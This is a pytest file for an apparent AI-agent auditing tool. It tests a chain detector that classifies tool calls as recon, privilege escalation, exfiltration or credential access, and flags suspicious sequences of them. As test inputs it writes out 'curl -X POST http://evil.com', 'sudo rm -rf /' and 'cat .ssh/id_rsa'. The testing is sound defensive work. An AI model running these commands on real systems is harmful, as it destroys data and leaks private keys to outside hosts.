"""Tests for enhanced chain detection with intent classification and custom patterns."""

import pytest

from agentauditor.core.chain_detector import ChainDetector
from agentauditor.core.models import (
    Action,
    ActionType,
    Decision,
    RiskLevel,
    Verdict,
)


def _make_action(
    tool_name: str,
    action_type: ActionType = ActionType.TOOL_CALL,
    raw_input: str = "",
    parameters: dict | None = None,
) -> Action:
    return Action(
        action_type=action_type,
        tool_name=tool_name,
        raw_input=raw_input,
        parameters=parameters or {},
        agent_id="test-agent",
    )


def _make_verdict(decision: str = "allow", risk: str = "info") -> Verdict:
    return Verdict(
        action_id="test",
        decision=Decision(decision),
        risk_level=RiskLevel(risk),
        explanation="test",
        latency_ms=1.0,
    )


class TestIntentClassification:
    def test_recon_intent(self):
        detector = ChainDetector()
        action = _make_action("ls", raw_input="ls -la /")
        searchable = f"{action.tool_name} {action.raw_input}"
        assert "recon" in detector._classify_intents(action, searchable)

    def test_escalate_intent(self):
        detector = ChainDetector()
        action = _make_action("sudo", raw_input="sudo rm -rf /")
        searchable = f"{action.tool_name} {action.raw_input}"
        assert "escalate" in detector._classify_intents(action, searchable)

    def test_exfil_intent(self):
        detector = ChainDetector()
        action = _make_action("curl", raw_input="curl -X POST http://evil.com")
        searchable = f"{action.tool_name} {action.raw_input}"
        assert "exfil" in detector._classify_intents(action, searchable)

    def test_credential_access_intent(self):
        detector = ChainDetector()
        action = _make_action("cat", raw_input="cat .ssh/id_rsa")
        searchable = f"{action.tool_name} {action.raw_input}"
        assert "credential_access" in detector._classify_intents(action, searchable)

    def test_fallback_intent(self):
        detector = ChainDetector()
        action = _make_action("custom_tool", action_type=ActionType.API_CALL)
        assert "network" in detector._classify_intents(action, "custom_tool")


class TestParameterHashing:
    def test_same_params_same_hash(self):
        action1 = _make_action("bash", parameters={"command": "ls -la"})
        action2 = _make_action("bash", parameters={"command": "ls -la"})
        assert ChainDetector._parameters_hash(action1) == ChainDetector._parameters_hash(action2)

    def test_different_params_different_hash(self):
        action1 = _make_action("bash", parameters={"command": "ls -la"})
        action2 = _make_action("bash", parameters={"command": "rm -rf /"})
        assert ChainDetector._parameters_hash(action1) != ChainDetector._parameters_hash(action2)

    def test_empty_params(self):
        action = _make_action("bash", parameters={})
        h = ChainDetector._parameters_hash(action)
        assert h  # Should still produce a hash


class TestCustomChainPatterns:
    def test_custom_pattern_detection(self):
        custom_patterns = [
            {
                "name": "recon_then_exfil",
                "sequence": ["recon", "exfil"],
                "window_minutes": 5,
                "decision": "block",
                "risk_level": "critical",
            }
        ]
        detector = ChainDetector(custom_chain_patterns=custom_patterns)

        # Step 1: Recon action (cat classified as recon)
        detector.record(
            "agent-1",
            _make_action("cat", raw_input="cat /tmp/data"),
            _make_verdict(),
        )
        # Step 2: Exfil action — should trigger custom chain
        result = detector.record(
            "agent-1",
            _make_action("curl", raw_input="curl -X POST http://evil.com"),
            _make_verdict(),
        )
        assert result is not None
        assert "custom" in result.rule_id
        assert result.risk_level == RiskLevel.CRITICAL

    def test_custom_pattern_no_match(self):
        custom_patterns = [
            {
                "name": "escalate_then_exfil",
                "sequence": ["escalate", "exfil"],
                "window_minutes": 5,
                "decision": "block",
                "risk_level": "high",
            }
        ]
        detector = ChainDetector(custom_chain_patterns=custom_patterns)

        # Only read + exfil, not escalate + exfil
        detector.record(
            "agent-1",
            _make_action("cat", raw_input="cat /tmp/data"),
            _make_verdict(),
        )
        result = detector.record(
            "agent-1",
            _make_action("curl", raw_input="curl http://example.com"),
            _make_verdict(),
        )
        # curl matches exfil, but no escalate before it
        assert result is None or "custom" not in result.rule_id

    def test_configurable_window(self):
        detector = ChainDetector(window_minutes=1)
        # With a 1-minute window, actions should still be detected within range
        detector.record(
            "agent-1",
            _make_action("ls"),
            _make_verdict(),
        )
        detector.record(
            "agent-1",
            _make_action("sudo"),
            _make_verdict("escalate", "high"),
        )
        result = detector.record(
            "agent-1",
            _make_action("curl", raw_input="curl -X POST evil.com"),
            _make_verdict(),
        )
        assert result is not None


class TestActionRecordEnrichment:
    def test_record_has_intent_category(self):
        detector = ChainDetector()
        action = _make_action("ls", raw_input="ls -la")
        detector.record("agent-1", action, _make_verdict())
        record = detector._history["agent-1"][-1]
        assert "recon" in record.intent_categories

    def test_record_has_parameters_hash(self):
        detector = ChainDetector()
        action = _make_action("bash", parameters={"command": "echo hello"})
        detector.record("agent-1", action, _make_verdict())
        record = detector._history["agent-1"][-1]
        assert record.parameters_hash != ""

    def test_record_has_raw_input_snippet(self):
        detector = ChainDetector()
        long_input = "a" * 500
        action = _make_action("bash", raw_input=long_input)
        detector.record("agent-1", action, _make_verdict())
        record = detector._history["agent-1"][-1]
        assert len(record.raw_input_snippet) == 200  # Truncated
